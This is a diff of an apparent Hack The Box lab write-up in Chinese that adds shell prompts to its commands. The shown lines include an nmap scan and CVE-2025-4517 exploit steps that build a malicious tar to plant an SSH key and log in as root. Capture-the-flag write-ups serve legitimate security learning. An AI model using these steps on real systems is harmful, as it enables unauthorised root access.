@@ -14,7 +14,7 @@ comments: true
 
 ## Port Scanning & Subdomain Enumeration & Directory Scanning
 ```bash
-nmap -sC -sV 10.129.12.145
+$ nmap -sC -sV 10.129.12.145
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-26 15:21 CST
 Nmap scan report for wingdata.htb (10.129.12.145)
 Host is up (0.20s latency).
@@ -190,11 +190,11 @@ if __name__ == "__main__":
 和我們的狀態蠻類似的 → `CVE-2025-4517` → [CVE-2025-4138 / CVE-2025-4517](https://github.com/DesertDemons/CVE-2025-4138-4517-POC)
 ```bash
 # 1. Generate an SSH key pair (REQUIRED — must exist before creating tar)
-ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
-cat ~/.ssh/id_ed25519.pub   # verify key was created
+$ ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
+$ cat ~/.ssh/id_ed25519.pub   # verify key was created
 
 # 2. Create the malicious tar archive
-python3 exploit.py \
+$ python3 exploit.py \
     --preset ssh-key \
     --payload ~/.ssh/id_ed25519.pub \
     --tar-out ./evil.tar
@@ -204,7 +204,7 @@ python3 exploit.py \
 #    Example: sudo python3 vulnerable_app.py --extract evil.tar
 
 # 4. SSH in as root (use the SAME key you generated in step 1)
-ssh -i ~/.ssh/id_ed25519 root@target
+$ ssh -i ~/.ssh/id_ed25519 root@target
 ```
 基本上我們的操作和上面的作者的順序差不多，另外可以先在host透過wget把exploit poc送過去()
 ```bash
